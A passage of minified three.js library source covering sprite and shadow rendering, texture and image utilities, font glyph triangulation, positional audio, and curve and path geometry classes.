THREE.SkinnedMesh&&k.skinning,S=C.customDepthMaterial?C.customDepthMaterial:O?N?E:u:N?c:l,e.setMaterialFaces(k),M instanceof THREE.BufferGeometry?e.renderBufferDirect(w,t,U,S,M,C):e.renderBuffer(w,t,U,S,M,C);for(y=0,H=i.length;H>y;y++)A=i[y],C=A.object,C.visible&&C.castShadow&&(C._modelViewMatrix.multiplyMatrices(w.matrixWorldInverse,C.matrixWorld),e.renderImmediateObject(w,t,U,l,C))}var G=e.getClearColor(),I=e.getClearAlpha();f.clearColor(G.r,G.g,G.b,I),f.enable(f.BLEND),e.shadowMapCullFace===THREE.CullFaceFront&&f.cullFace(f.BACK),e.resetGLState()}}},THREE.SpritePlugin=function(e,t){function r(){var t=c.createProgram(),r=c.createShader(c.VERTEX_SHADER),i=c.createShader(c.FRAGMENT_SHADER);return c.shaderSource(r,["precision "+e.getPrecision()+" float;","uniform mat4 modelViewMatrix;","uniform mat4 projectionMatrix;","uniform float rotation;","uniform vec2 scale;","uniform vec2 uvOffset;","uniform vec2 uvScale;","attribute vec2 position;","attribute vec2 uv;","varying vec2 vUV;","void main() {","vUV = uvOffset + uv * uvScale;","vec2 alignedPosition = position * scale;","vec2 rotatedPosition;","rotatedPosition.x = cos( rotation ) * alignedPosition.x - sin( rotation ) * alignedPosition.y;","rotatedPosition.y = sin( rotation ) * alignedPosition.x + cos( rotation ) * alignedPosition.y;","vec4 finalPosition;","finalPosition = modelViewMatrix * vec4( 0.0, 0.0, 0.0, 1.0 );","finalPosition.xy += rotatedPosition;","finalPosition = projectionMatrix * finalPosition;","gl_Position = finalPosition;","}"].join("\n")),c.shaderSource(i,["precision "+e.getPrecision()+" float;","uniform vec3 color;","uniform sampler2D map;","uniform float opacity;","uniform int fogType;","uniform vec3 fogColor;","uniform float fogDensity;","uniform float fogNear;","uniform float fogFar;","uniform float alphaTest;","varying vec2 vUV;","void main() {","vec4 texture = texture2D( map, vUV );","if ( texture.a < alphaTest ) discard;","gl_FragColor = vec4( color * texture.xyz, texture.a * opacity );","if ( fogType > 0 ) {","float depth = gl_FragCoord.z / gl_FragCoord.w;","float fogFactor = 0.0;","if ( fogType == 1 ) {","fogFactor = smoothstep( fogNear, fogFar, depth );","} else {","const float LOG2 = 1.442695;","float fogFactor = exp2( - fogDensity * fogDensity * depth * depth * LOG2 );","fogFactor = 1.0 - clamp( fogFactor, 0.0, 1.0 );","}","gl_FragColor = mix( gl_FragColor, vec4( fogColor, gl_FragColor.w ), fogFactor );","}","}"].join("\n")),c.compileShader(r),c.compileShader(i),c.attachShader(t,r),c.attachShader(t,i),c.linkProgram(t),t}function i(e,t){return e.z!==t.z?t.z-e.z:t.id-e.id}var n,a,o,s,h,l,c=e.context,u=new THREE.Vector3,E=new THREE.Quaternion,f=new THREE.Vector3,p=function(){var e=new Float32Array([-.5,-.5,0,0,.5,-.5,1,0,.5,.5,1,1,-.5,.5,0,1]),t=new Uint16Array([0,1,2,0,2,3]);n=c.createBuffer(),a=c.createBuffer(),c.bindBuffer(c.ARRAY_BUFFER,n),c.bufferData(c.ARRAY_BUFFER,e,c.STATIC_DRAW),c.bindBuffer(c.ELEMENT_ARRAY_BUFFER,a),c.bufferData(c.ELEMENT_ARRAY_BUFFER,t,c.STATIC_DRAW),o=r(),s={position:c.getAttribLocation(o,"position"),uv:c.getAttribLocation(o,"uv")},h={uvOffset:c.getUniformLocation(o,"uvOffset"),uvScale:c.getUniformLocation(o,"uvScale"),rotation:c.getUniformLocation(o,"rotation"),scale:c.getUniformLocation(o,"scale"),color:c.getUniformLocation(o,"color"),map:c.getUniformLocation(o,"map"),opacity:c.getUniformLocation(o,"opacity"),modelViewMatrix:c.getUniformLocation(o,"modelViewMatrix"),projectionMatrix:c.getUniformLocation(o,"projectionMatrix"),fogType:c.getUniformLocation(o,"fogType"),fogDensity:c.getUniformLocation(o,"fogDensity"),fogNear:c.getUniformLocation(o,"fogNear"),fogFar:c.getUniformLocation(o,"fogFar"),fogColor:c.getUniformLocation(o,"fogColor"),alphaTest:c.getUniformLocation(o,"alphaTest")};var i=document.createElement("canvas");i.width=8,i.height=8;var u=i.getContext("2d");u.fillStyle="white",u.fillRect(0,0,8,8),l=new THREE.Texture(i),l.needsUpdate=!0};this.render=function(r,d){if(0!==t.length){void 0===o&&p(),c.useProgram(o),c.enableVertexAttribArray(s.position),c.enableVertexAttribArray(s.uv),c.disable(c.CULL_FACE),c.enable(c.BLEND),c.bindBuffer(c.ARRAY_BUFFER,n),c.vertexAttribPointer(s.position,2,c.FLOAT,!1,16,0),c.vertexAttribPointer(s.uv,2,c.FLOAT,!1,16,8),c.bindBuffer(c.ELEMENT_ARRAY_BUFFER,a),c.uniformMatrix4fv(h.projectionMatrix,!1,d.projectionMatrix.elements),c.activeTexture(c.TEXTURE0),c.uniform1i(h.map,0);var m=0,T=0,g=r.fog;g?(c.uniform3f(h.fogColor,g.color.r,g.color.g,g.color.b),g instanceof THREE.Fog?(c.uniform1f(h.fogNear,g.near),c.uniform1f(h.fogFar,g.far),c.uniform1i(h.fogType,1),m=1,T=1):g instanceof THREE.FogExp2&&(c.uniform1f(h.fogDensity,g.density),c.uniform1i(h.fogType,2),m=2,T=2)):(c.uniform1i(h.fogType,0),m=0,T=0);for(var v=0,R=t.length;R>v;v++){var y=t[v];y._modelViewMatrix.multiplyMatrices(d.matrixWorldInverse,y.matrixWorld),y.z=-y._modelViewMatrix.elements[14]}t.sort(i);for(var H=[],v=0,R=t.length;R>v;v++){var y=t[v],x=y.material;c.uniform1f(h.alphaTest,x.alphaTest),c.uniformMatrix4fv(h.modelViewMatrix,!1,y._modelViewMatrix.elements),y.matrixWorld.decompose(u,E,f),H[0]=f.x,H[1]=f.y;var b=0;r.fog&&x.fog&&(b=T),m!==b&&(c.uniform1i(h.fogType,b),m=b),null!==x.map?(c.uniform2f(h.uvOffset,x.map.offset.x,x.map.offset.y),c.uniform2f(h.uvScale,x.map.repeat.x,x.map.repeat.y)):(c.uniform2f(h.uvOffset,0,0),c.uniform2f(h.uvScale,1,1)),c.uniform1f(h.opacity,x.opacity),c.uniform3f(h.color,x.color.r,x.color.g,x.color.b),c.uniform1f(h.rotation,x.rotation),c.uniform2fv(h.scale,H),e.state.setBlending(x.blending,x.blendEquation,x.blendSrc,x.blendDst),e.state.setDepthTest(x.depthTest),e.state.setDepthWrite(x.depthWrite),x.map&&x.map.image&&x.map.image.width?e.setTexture(x.map,0):e.setTexture(l,0),c.drawElements(c.TRIANGLES,6,c.UNSIGNED_SHORT,0)}c.enable(c.CULL_FACE),e.resetGLState()}}},THREE.GeometryUtils={merge:function(e,t,r){THREE.warn("THREE.GeometryUtils: .merge() has been moved to Geometry. Use geometry.merge( geometry2, matrix, materialIndexOffset ) instead.");var i;t instanceof THREE.Mesh&&(t.matrixAutoUpdate&&t.updateMatrix(),i=t.matrix,t=t.geometry),e.merge(t,i,r)},center:function(e){return THREE.warn("THREE.GeometryUtils: .center() has been moved to Geometry. Use geometry.center() instead."),e.center()}},THREE.ImageUtils={crossOrigin:void 0,loadTexture:function(e,t,r,i){var n=new THREE.ImageLoader;n.crossOrigin=this.crossOrigin;var a=new THREE.Texture(void 0,t);return n.load(e,function(e){a.image=e,a.needsUpdate=!0,r&&r(a)},void 0,function(e){i&&i(e)}),a.sourceFile=e,a},loadTextureCube:function(e,t,r,i){var n=[],a=new THREE.ImageLoader;a.crossOrigin=this.crossOrigin;var o=new THREE.CubeTexture(n,t);o.flipY=!1;for(var s=0,h=function(t){a.load(e[t],function(e){o.images[t]=e,s+=1,6===s&&(o.needsUpdate=!0,r&&r(o))},void 0,i)},l=0,c=e.length;c>l;++l)h(l);return o},loadCompressedTexture:function(){THREE.error("THREE.ImageUtils.loadCompressedTexture has been removed. Use THREE.DDSLoader instead.")},loadCompressedTextureCube:function(){THREE.error("THREE.ImageUtils.loadCompressedTextureCube has been removed. Use THREE.DDSLoader instead.")},getNormalMap:function(e,t){var r=function(e,t){return[e[1]*t[2]-e[2]*t[1],e[2]*t[0]-e[0]*t[2],e[0]*t[1]-e[1]*t[0]]},i=function(e,t){return[e[0]-t[0],e[1]-t[1],e[2]-t[2]]},n=function(e){var t=Math.sqrt(e[0]*e[0]+e[1]*e[1]+e[2]*e[2]);return[e[0]/t,e[1]/t,e[2]/t]};t=1|t;var a=e.width,o=e.height,s=document.createElement("canvas");s.width=a,s.height=o;var h=s.getContext("2d");h.drawImage(e,0,0);for(var l=h.getImageData(0,0,a,o).data,c=h.createImageData(a,o),u=c.data,E=0;a>E;E++)for(var f=0;o>f;f++){var p=0>f-1?0:f-1,d=f+1>o-1?o-1:f+1,m=0>E-1?0:E-1,T=E+1>a-1?a-1:E+1,g=[],v=[0,0,l[4*(f*a+E)]/255*t];g.push([-1,0,l[4*(f*a+m)]/255*t]),g.push([-1,-1,l[4*(p*a+m)]/255*t]),g.push([0,-1,l[4*(p*a+E)]/255*t]),g.push([1,-1,l[4*(p*a+T)]/255*t]),g.push([1,0,l[4*(f*a+T)]/255*t]),g.push([1,1,l[4*(d*a+T)]/255*t]),g.push([0,1,l[4*(d*a+E)]/255*t]),g.push([-1,1,l[4*(d*a+m)]/255*t]);for(var R=[],y=g.length,H=0;y>H;H++){var x=g[H],b=g[(H+1)%y];x=i(x,v),b=i(b,v),R.push(n(r(x,b)))}for(var _=[0,0,0],H=0;H<R.length;H++)_[0]+=R[H][0],_[1]+=R[H][1],_[2]+=R[H][2];_[0]/=R.length,_[1]/=R.length,_[2]/=R.length;var w=4*(f*a+E);u[w]=(_[0]+1)/2*255|0,u[w+1]=(_[1]+1)/2*255|0,u[w+2]=255*_[2]|0,u[w+3]=255}return h.putImageData(c,0,0),s},generateDataTexture:function(e,t,r){for(var i=e*t,n=new Uint8Array(3*i),a=Math.floor(255*r.r),o=Math.floor(255*r.g),s=Math.floor(255*r.b),h=0;i>h;h++)n[3*h]=a,n[3*h+1]=o,n[3*h+2]=s;var l=new THREE.DataTexture(n,e,t,THREE.RGBFormat);return l.needsUpdate=!0,l}},THREE.SceneUtils={createMultiMaterialObject:function(e,t){for(var r=new THREE.Object3D,i=0,n=t.length;n>i;i++)r.add(new THREE.Mesh(e,t[i]));return r},detach:function(e,t,r){e.applyMatrix(t.matrixWorld),t.remove(e),r.add(e)},attach:function(e,t,r){var i=new THREE.Matrix4;i.getInverse(r.matrixWorld),e.applyMatrix(i),t.remove(e),r.add(e)}},THREE.FontUtils={faces:{},face:"helvetiker",weight:"normal",style:"normal",size:150,divisions:10,getFace:function(){try{return this.faces[this.face][this.weight][this.style]}catch(e){throw"The font "+this.face+" with "+this.weight+" weight and "+this.style+" style is missing."}},loadFace:function(e){var t=e.familyName.toLowerCase(),r=this;return r.faces[t]=r.faces[t]||{},r.faces[t][e.cssFontWeight]=r.faces[t][e.cssFontWeight]||{},r.faces[t][e.cssFontWeight][e.cssFontStyle]=e,r.faces[t][e.cssFontWeight][e.cssFontStyle]=e,e},drawText:function(e){var t,r=this.getFace(),i=this.size/r.resolution,n=0,a=String(e).split(""),o=a.length,s=[];for(t=0;o>t;t++){var h=new THREE.Path,l=this.extractGlyphPoints(a[t],r,i,n,h);n+=l.offset,s.push(l.path)}var c=n/2;return{paths:s,offset:c}},extractGlyphPoints:function(e,t,r,i,n){var a,o,s,h,l,c,u,E,f,p,d,m,T,g,v,R,y,H,x,b=[],_=t.glyphs[e]||t.glyphs["?"];if(_){if(_.o)for(h=_._cachedOutline||(_._cachedOutline=_.o.split(" ")),c=h.length,u=r,E=r,a=0;c>a;)switch(l=h[a++]){case"m":f=h[a++]*u+i,p=h[a++]*E,n.moveTo(f,p);break;case"l":f=h[a++]*u+i,p=h[a++]*E,n.lineTo(f,p);break;case"q":if(d=h[a++]*u+i,m=h[a++]*E,v=h[a++]*u+i,R=h[a++]*E,n.quadraticCurveTo(v,R,d,m),x=b[b.length-1])for(T=x.x,g=x.y,o=1,s=this.divisions;s>=o;o++){var w=o/s;THREE.Shape.Utils.b2(w,T,v,d),THREE.Shape.Utils.b2(w,g,R,m)}break;case"b":if(d=h[a++]*u+i,m=h[a++]*E,v=h[a++]*u+i,R=h[a++]*E,y=h[a++]*u+i,H=h[a++]*E,n.bezierCurveTo(v,R,y,H,d,m),x=b[b.length-1])for(T=x.x,g=x.y,o=1,s=this.divisions;s>=o;o++){var w=o/s;THREE.Shape.Utils.b3(w,T,v,y,d),THREE.Shape.Utils.b3(w,g,R,H,m)}}return{offset:_.ha*r,path:n}}}},THREE.FontUtils.generateShapes=function(e,t){t=t||{};var r=void 0!==t.size?t.size:100,i=void 0!==t.curveSegments?t.curveSegments:4,n=void 0!==t.font?t.font:"helvetiker",a=void 0!==t.weight?t.weight:"normal",o=void 0!==t.style?t.style:"normal";THREE.FontUtils.size=r,THREE.FontUtils.divisions=i,THREE.FontUtils.face=n,THREE.FontUtils.weight=a,THREE.FontUtils.style=o;for(var s=THREE.FontUtils.drawText(e),h=s.paths,l=[],c=0,u=h.length;u>c;c++)Array.prototype.push.apply(l,h[c].toShapes());return l},function(e){var t=1e-10,r=function(e,t){var r=e.length;if(3>r)return null;var a,o,s,h=[],l=[],c=[];if(i(e)>0)for(o=0;r>o;o++)l[o]=o;else for(o=0;r>o;o++)l[o]=r-1-o;var u=r,E=2*u;for(o=u-1;u>2;){if(E--<=0)return THREE.warn("THREE.FontUtils: Warning, unable to triangulate polygon! in Triangulate.process()"),t?c:h;if(a=o,a>=u&&(a=0),o=a+1,o>=u&&(o=0),s=o+1,s>=u&&(s=0),n(e,a,o,s,u,l)){var f,p,d,m,T;for(f=l[a],p=l[o],d=l[s],h.push([e[f],e[p],e[d]]),c.push([l[a],l[o],l[s]]),m=o,T=o+1;u>T;m++,T++)l[m]=l[T];u--,E=2*u}}return t?c:h},i=function(e){for(var t=e.length,r=0,i=t-1,n=0;t>n;i=n++)r+=e[i].x*e[n].y-e[n].x*e[i].y;return.5*r},n=function(e,r,i,n,a,o){var s,h,l,c,u,E,f,p,d;if(h=e[o[r]].x,l=e[o[r]].y,c=e[o[i]].x,u=e[o[i]].y,E=e[o[n]].x,f=e[o[n]].y,t>(c-h)*(f-l)-(u-l)*(E-h))return!1;var m,T,g,v,R,y,H,x,b,_,w,M,S,A,C;for(m=E-c,T=f-u,g=h-E,v=l-f,R=c-h,y=u-l,s=0;a>s;s++)if(p=e[o[s]].x,d=e[o[s]].y,!(p===h&&d===l||p===c&&d===u||p===E&&d===f)&&(H=p-h,x=d-l,b=p-c,_=d-u,w=p-E,M=d-f,C=m*_-T*b,S=R*x-y*H,A=g*M-v*w,C>=-t&&A>=-t&&S>=-t))return!1;return!0};return e.Triangulate=r,e.Triangulate.area=i,e}(THREE.FontUtils),self._typeface_js={faces:THREE.FontUtils.faces,loadFace:THREE.FontUtils.loadFace},THREE.typeface_js=self._typeface_js,THREE.Audio=function(e){THREE.Object3D.call(this),this.type="Audio",this.context=e.context,this.source=this.context.createBufferSource(),this.source.onended=this.onEnded.bind(this),this.gain=this.context.createGain(),this.gain.connect(this.context.destination),this.panner=this.context.createPanner(),this.panner.connect(this.gain),this.autoplay=!1,this.startTime=0,this.isPlaying=!1},THREE.Audio.prototype=Object.create(THREE.Object3D.prototype),THREE.Audio.prototype.constructor=THREE.Audio,THREE.Audio.prototype.load=function(e){var t=this,r=new XMLHttpRequest;return r.open("GET",e,!0),r.responseType="arraybuffer",r.onload=function(e){t.context.decodeAudioData(this.response,function(e){t.source.buffer=e,t.autoplay&&t.play()})},r.send(),this},THREE.Audio.prototype.play=function(){if(this.isPlaying===!0)return void THREE.warn("THREE.Audio: Audio is already playing.");var e=this.context.createBufferSource();e.buffer=this.source.buffer,e.loop=this.source.loop,e.onended=this.source.onended,e.connect(this.panner),e.start(0,this.startTime),this.isPlaying=!0,this.source=e},THREE.Audio.prototype.pause=function(){this.source.stop(),this.startTime=this.context.currentTime},THREE.Audio.prototype.stop=function(){this.source.stop(),this.startTime=0},THREE.Audio.prototype.onEnded=function(){this.isPlaying=!1},THREE.Audio.prototype.setLoop=function(e){this.source.loop=e},THREE.Audio.prototype.setRefDistance=function(e){this.panner.refDistance=e},THREE.Audio.prototype.setRolloffFactor=function(e){this.panner.rolloffFactor=e},THREE.Audio.prototype.setVolume=function(e){this.gain.gain.value=e},THREE.Audio.prototype.updateMatrixWorld=function(){var e=new THREE.Vector3;return function(t){THREE.Object3D.prototype.updateMatrixWorld.call(this,t),e.setFromMatrixPosition(this.matrixWorld),this.panner.setPosition(e.x,e.y,e.z)}}(),THREE.AudioListener=function(){THREE.Object3D.call(this),this.type="AudioListener",this.context=new(window.AudioContext||window.webkitAudioContext)},THREE.AudioListener.prototype=Object.create(THREE.Object3D.prototype),THREE.AudioListener.prototype.constructor=THREE.AudioListener,THREE.AudioListener.prototype.updateMatrixWorld=function(){var e=new THREE.Vector3,t=new THREE.Quaternion,r=new THREE.Vector3,i=new THREE.Vector3,n=new THREE.Vector3,a=new THREE.Vector3;return function(o){THREE.Object3D.prototype.updateMatrixWorld.call(this,o);var s=this.context.listener,h=this.up;this.matrixWorld.decompose(e,t,r),i.set(0,0,-1).applyQuaternion(t),n.subVectors(e,a),s.setPosition(e.x,e.y,e.z),s.setOrientation(i.x,i.y,i.z,h.x,h.y,h.z),s.setVelocity(n.x,n.y,n.z),a.copy(e)}}(),THREE.Curve=function(){},THREE.Curve.prototype.getPoint=function(e){return THREE.warn("THREE.Curve: Warning, getPoint() not implemented!"),null},THREE.Curve.prototype.getPointAt=function(e){var t=this.getUtoTmapping(e);return this.getPoint(t)},THREE.Curve.prototype.getPoints=function(e){e||(e=5);var t,r=[];for(t=0;e>=t;t++)r.push(this.getPoint(t/e));return r},THREE.Curve.prototype.getSpacedPoints=function(e){e||(e=5);var t,r=[];for(t=0;e>=t;t++)r.push(this.getPointAt(t/e));return r},THREE.Curve.prototype.getLength=function(){var e=this.getLengths();return e[e.length-1]},THREE.Curve.prototype.getLengths=function(e){if(e||(e=this.__arcLengthDivisions?this.__arcLengthDivisions:200),this.cacheArcLengths&&this.cacheArcLengths.length==e+1&&!this.needsUpdate)return this.cacheArcLengths;this.needsUpdate=!1;var t,r,i=[],n=this.getPoint(0),a=0;for(i.push(0),r=1;e>=r;r++)t=this.getPoint(r/e),a+=t.distanceTo(n),i.push(a),n=t;return this.cacheArcLengths=i,i},THREE.Curve.prototype.updateArcLengths=function(){this.needsUpdate=!0,this.getLengths()},THREE.Curve.prototype.getUtoTmapping=function(e,t){var r,i=this.getLengths(),n=0,a=i.length;r=t?t:e*i[a-1];for(var o,s=0,h=a-1;h>=s;)if(n=Math.floor(s+(h-s)/2),o=i[n]-r,0>o)s=n+1;else{if(!(o>0)){h=n;break}h=n-1}if(n=h,i[n]==r){var l=n/(a-1);return l}var c=i[n],u=i[n+1],E=u-c,f=(r-c)/E,l=(n+f)/(a-1);return l},THREE.Curve.prototype.getTangent=function(e){var t=1e-4,r=e-t,i=e+t;0>r&&(r=0),i>1&&(i=1);var n=this.getPoint(r),a=this.getPoint(i),o=a.clone().sub(n);return o.normalize()},THREE.Curve.prototype.getTangentAt=function(e){var t=this.getUtoTmapping(e);return this.getTangent(t)},THREE.Curve.Utils={tangentQuadraticBezier:function(e,t,r,i){return 2*(1-e)*(r-t)+2*e*(i-r)},tangentCubicBezier:function(e,t,r,i,n){return-3*t*(1-e)*(1-e)+3*r*(1-e)*(1-e)-6*e*r*(1-e)+6*e*i*(1-e)-3*e*e*i+3*e*e*n},tangentSpline:function(e,t,r,i,n){var a=6*e*e-6*e,o=3*e*e-4*e+1,s=-6*e*e+6*e,h=3*e*e-2*e;return a+o+s+h},interpolate:function(e,t,r,i,n){var a=.5*(r-e),o=.5*(i-t),s=n*n,h=n*s;return(2*t-2*r+a+o)*h+(-3*t+3*r-2*a-o)*s+a*n+t}},THREE.Curve.create=function(e,t){return e.prototype=Object.create(THREE.Curve.prototype),e.prototype.constructor=e,e.prototype.getPoint=t,e},THREE.CurvePath=function(){this.curves=[],this.bends=[],this.autoClose=!1},THREE.CurvePath.prototype=Object.create(THREE.Curve.prototype),THREE.CurvePath.prototype.constructor=THREE.CurvePath,THREE.CurvePath.prototype.add=function(e){this.curves.push(e)},THREE.CurvePath.prototype.checkConnection=function(){},THREE.CurvePath.prototype.closePath=function(){var e=this.curves[0].getPoint(0),t=this.curves[this.curves.length-1].getPoint(1);e.equals(t)||this.curves.push(new THREE.LineCurve(t,e))},THREE.CurvePath.prototype.getPoint=function(e){for(var t,r,i=e*this.getLength(),n=this.getCurveLengths(),a=0;a<n.length;){if(n[a]>=i){t=n[a]-i,r=this.curves[a];var o=1-t/r.getLength();return r.getPointAt(o)}a++}return null},THREE.CurvePath.prototype.getLength=function(){var e=this.getCurveLengths();return e[e.length-1]},THREE.CurvePath.prototype.getCurveLengths=function(){if(this.cacheLengths&&this.cacheLengths.length==this.curves.length)return this.cacheLengths;var e,t=[],r=0,i=this.curves.length;for(e=0;i>e;e++)r+=this.curves[e].getLength(),t.push(r);return this.cacheLengths=t,t},THREE.CurvePath.prototype.getBoundingBox=function(){var e,t,r,i,n,a,o=this.getPoints();e=t=Number.NEGATIVE_INFINITY,i=n=Number.POSITIVE_INFINITY;var s,h,l,c,u=o[0]instanceof THREE.Vector3;for(c=u?new THREE.Vector3:new THREE.Vector2,h=0,l=o.length;l>h;h++)s=o[h],s.x>e?e=s.x:s.x<i&&(i=s.x),s.y>t?t=s.y:s.y<n&&(n=s.y),u&&(s.z>r?r=s.z:s.z<a&&(a=s.z)),c.add(s);var E={minX:i,minY:n,maxX:e,maxY:t};return u&&(E.maxZ=r,E.minZ=a),E},THREE.CurvePath.prototype.createPointsGeometry=function(e){var t=this.getPoints(e,!0);return this.createGeometry(t)},THREE.CurvePath.prototype.createSpacedPointsGeometry=function(e){var t=this.getSpacedPoints(e,!0);return this.createGeometry(t)},THREE.CurvePath.prototype.createGeometry=function(e){for(var t=new THREE.Geometry,r=0;r<e.length;r++)t.vertices.push(new THREE.Vector3(e[r].x,e[r].y,e[r].z||0));return t},THREE.CurvePath.prototype.addWrapPath=function(e){this.bends.push(e)},THREE.CurvePath.prototype.getTransformedPoints=function(e,t){var r,i,n=this.getPoints(e);for(t||(t=this.bends),r=0,i=t.length;i>r;r++)n=this.getWrapPoints(n,t[r]);return n},THREE.CurvePath.prototype.getTransformedSpacedPoints=function(e,t){var r,i,n=this.getSpacedPoints(e);for(t||(t=this.bends),r=0,i=t.length;i>r;r++)n=this.getWrapPoints(n,t[r]);return n},THREE.CurvePath.prototype.getWrapPoints=function(e,t){var r,i,n,a,o,s,h=this.getBoundingBox();for(r=0,i=e.length;i>r;r++){n=e[r],a=n.x,o=n.y,s=a/h.maxX,s=t.getUtoTmapping(s,a);var l=t.getPoint(s),c=t.getTangent(s);c.set(-c.y,c.x).multiplyScalar(o),n.x=l.x+c.x,n.y=l.y+c.y}return e},THREE.Gyroscope=function(){THREE.Object3D.call(this)},THREE.Gyroscope.prototype=Object.create(THREE.Object3D.prototype),THREE.Gyroscope.prototype.constructor=THREE.Gyroscope,THREE.Gyroscope.prototype.updateMatrixWorld=function(){var e=new THREE.Vector3,t=new THREE.Quaternion,r=new THREE.Vector3,i=new THREE.Vector3,n=new THREE.Quaternion,a=new THREE.Vector3;return function(o){this.matrixAutoUpdate&&this.updateMatrix(),(this.matrixWorldNeedsUpdate||o)&&(this.parent?(this.matrixWorld.multiplyMatrices(this.parent.matrixWorld,this.matrix),this.matrixWorld.decompose(i,n,a),this.matrix.decompose(e,t,r),this.matrixWorld.compose(i,t,a)):this.matrixWorld.copy(this.matrix),this.matrixWorldNeedsUpdate=!1,o=!0);for(var s=0,h=this.children.length;h>s;s++)this.children[s].updateMatrixWorld(o)}}(),THREE.Path=function(e){THREE.CurvePath.call(this),this.actions=[],e&&this.fromPoints(e)},THREE.Path.prototype=Object.create(THREE.CurvePath.prototype),THREE.Path.prototype.constructor=THREE.Path,THREE.PathActions={MOVE_TO:"moveTo",LINE_TO:"lineTo",QUADRATIC_CURVE_TO:"quadraticCurveTo",BEZIER_CURVE_TO:"bezierCurveTo",CSPLINE_THRU:"splineThru",ARC:"arc",ELLIPSE:"ellipse"},THREE.Path.prototype.fromPoints=function(e){this.moveTo(e[0].x,e[0].y);for(var t=1,r=e.length;r>t;t++)this.lineTo(e[t].x,e[t].y)},THREE.Path.prototype.moveTo=function(e,t){var r=Array.prototype.slice.call(arguments);this.actions.push({action:THREE.PathActions.MOVE_TO,args:r})},THREE.Path.prototype.lineTo=function(e,t){var r=Array.prototype.slice.call(arguments),i=this.actions[this.actions.length-1].args,n=i[i.length-2],a=i[i.length-1],o=new THREE.LineCurve(new THREE.Vector2(n,a),new THREE.Vector2(e,t));this.curves.push(o),this.actions.push({action:THREE.PathActions.LINE_TO,args:r})},THREE.Path.prototype.quadraticCurveTo=function(e,t,r,i){var n=Array.prototype.slice.call(arguments),a=this.actions[this.actions.length-1].args,o=a[a.length-2],s=a[a.length-1],h=new THREE.QuadraticBezierCurve(new THREE.Vector2(o,s),new THREE.Vector2(e,t),new THREE.Vector2(r,i));this.curves.push(h),this.actions.push({action:THREE.PathActions.QUADRATIC_CURVE_TO,args:n})},THREE.Path.prototype.bezierCurveTo=function(e,t,r,i,n,a){var o=Array.prototype.slice.call(arguments),s=this.actions[this.actions.length-1].args,h=s[s.length-2],l=s[s.length-1],c=new THREE.CubicBezierCurve(new THREE.Vector2(h,l),new THREE.Vector2(e,t),new THREE.Vector2(r,i),new THREE.Vector2(n,a));this.curves.push(c),this.actions.push({action:THREE.PathActions.BEZIER_CURVE_TO,args:o})},THREE.Path.prototype.splineThru=function(e){var t=Array.prototype.slice.call(arguments),r=this.actions[this.actions.length-1].args,i=r[r.length-2],n=r[r.length-1],a=[new THREE.Vector2(i,n)];Array.prototype.push.apply(a,e);var o=new THREE.SplineCurve(a);this.curves.push(o),this.actions.push({action:THREE.PathActions.CSPLINE_THRU,args:t})},THREE.Path.prototype.arc=function(e,t,r,i,n,a){var o=this.actions[this.actions.length-1].args,s=o[o.length-2],h=o[o.length-1];this.absarc(e+s,t+h,r,i,n,a)},THREE.Path.prototype.absarc=function(e,t,r,i,n,a){this.absellipse(e,t,r,r,i,n,a)},THREE.Path.prototype.ellipse=function(e,t,r,i,n,a,o){var s=this.actions[this.actions.length-1].args,h=s[s.length-2],l=s[s.length-1];this.absellipse(e+h,t+l,r,i,n,a,o)},THREE.Path.prototype.absellipse=function(e,t,r,i,n,a,o){var s=Array.prototype.slice.call(arguments),h=new THREE.EllipseCurve(e,t,r,i,n,a,o);this.curves.push(h);var l=h.getPoint(1);s.push(l.x),s.push(l.y),this.actions.push({action:THREE.PathActions.ELLIPSE,args:s})},THREE.Path.prototype.getSpacedPoints=function(e,t){e||(e=40);for(var r=[],i=0;e>i;i++)r.push(this.getPoint(i/e));return r},THREE.Path.prototype.getPoints=function(e,t){if(this.useSpacedPoints)return console.log("tata"),this.getSpacedPoints(e,t);e=e||12;var r,i,n,a,o,s,h,l,c,u,E,f,p,d,m,T,g,v,R=[];for(r=0,i=this.actions.length;i>r;r++)switch(n=this.actions[r],a=n.action,o=n.args,a){case THREE.PathActions.MOVE_TO:R.push(new THREE.Vector2(o[0],o[1]));break;case THREE.PathActions.LINE_TO:R.push(new THREE.Vector2(o[0],o[1]));break;case THREE.PathActions.QUADRATIC_CURVE_TO:for(s=o[2],h=o[3],u=o[0],E=o[1],R.length>0?(d=R[R.length-1],f=d.x,p=d.y):(d=this.actions[r-1].args,f=d[d.length-2],p=d[d.length-1]),m=1;e>=m;m++)T=m/e,g=THREE.Shape.Utils.b2(T,f,u,s),v=THREE.Shape.Utils.b2(T,p,E,h),R.push(new THREE.Vector2(g,v));break;case THREE.PathActions.BEZIER_CURVE_TO:for(s=o[4],h=o[5],u=o[0],E=o[1],l=o[2],c=o[3],R.length>0?(d=R[R.length-1],f=d.x,p=d.y):(d=this.actions[r-1].args,f=d[d.length-2],p=d[d.length-1]),m=1;e>=m;m++)T=m/e,g=THREE.Shape.Utils.b3(T,f,u,l,s),v=THREE.Shape.Utils.b3(T,p,E,c,h),R.push(new THREE.Vector2(g,v));break;case THREE.PathActions.CSPLINE_THRU:d=this.actions[r-1].args;var y=new THREE.Vector2(d[d.length-2],d[d.length-1]),H=[y],x=e*o[0].length;H=H.concat(o[0]);var b=new THREE.SplineCurve(H);for(m=1;x>=m;m++)R.push(b.getPointAt(m/x));break;case THREE.PathActions.ARC:var _,w=o[0],M=o[1],S=o[2],A=o[3],C=o[4],L=!!o[5],P=C-A,F=2*e;for(m=1;F>=m;m++)T=m/F,L||(T=1-T),_=A+T*P,g=w+S*Math.cos(_),v=M+S*Math.sin(_),R.push(new THREE.Vector2(g,v));break;case THREE.PathActions.ELLIPSE:var _,w=o[0],M=o[1],U=o[2],B=o[3],A=o[4],C=o[5],L=!!o[6],P=C-A,F=2*e;for(m=1;F>=m;m++)T=m/F,L||(T=1-T),_=A+T*P,g=w+U*Math.cos(_),v=M+B*Math.sin(_),R.push(new THREE.Vector2(g,v))}var D=R[R.length-1],V=1e-10;return Math.abs(D.x-R[0].x)<V&&Math.abs(D.y-R[0].y)<V&&R.splice(R.length-1,1),t&&R.push(R[0]),R},THREE.Path.prototype.toShapes=function(e,t){function r(e){var t,r,i,n,a,o=[],s=new THREE.Path;for(t=0,r=e.length;r>t;t++)i=e[t],a=i.args,n=i.action,n==THREE.PathActions.MOVE_TO&&0!=s.actions.length&&(o.push(s),s=new THREE.Path),s[n].apply(s,a);return 0!=s.actions.length&&o.push(s),o}function i(e){for(var t=[],r=0,i=e.length;i>r;r++){var n=e[r],a=new THREE.Shape;a.actions=n.actions,a.curves=n.curves,t.push(a)}return t}function n(e,t){for(var 